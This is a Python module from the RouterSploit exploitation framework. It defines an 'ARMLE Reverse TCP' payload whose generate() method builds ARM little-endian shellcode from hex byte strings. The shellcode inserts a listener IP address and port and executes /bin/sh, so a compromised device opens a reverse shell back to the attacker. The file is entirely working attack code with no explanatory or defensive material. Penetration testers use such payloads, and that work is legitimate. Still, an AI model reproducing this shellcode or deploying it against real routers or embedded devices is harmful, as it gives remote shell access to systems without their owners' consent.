from routersploit import validators
from routersploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)


class Exploit(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        'name': 'ARMLE Reverse TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }

    architecture = Architectures.ARMLE

    def generate(self):
        reverse_ip = validators.convert_ip(self.lhost)
        reverse_port = validators.convert_port(self.lport)
        return (
            "\x01\x10\x8F\xE2" +
            "\x11\xFF\x2F\xE1" +
            "\x02\x20\x01\x21" +
            "\x92\x1A\x0F\x02" +
            "\x19\x37\x01\xDF" +
            "\x06\x1C\x08\xA1" +
            "\x10\x22\x02\x37" +
            "\x01\xDF\x3F\x27" +
            "\x02\x21\x30\x1c" +
            "\x01\xdf\x01\x39" +
            "\xFB\xD5\x05\xA0" +
            "\x92\x1a\x05\xb4" +
            "\x69\x46\x0b\x27" +
            "\x01\xDF\xC0\x46" +
            "\x02\x00" + reverse_port +  # "\x12\x34" struct sockaddr and port
            reverse_ip +                 # reverse ip address
            "\x2f\x62\x69\x6e" +         # /bin
            "\x2f\x73\x68\x00"           # /sh\0
        )
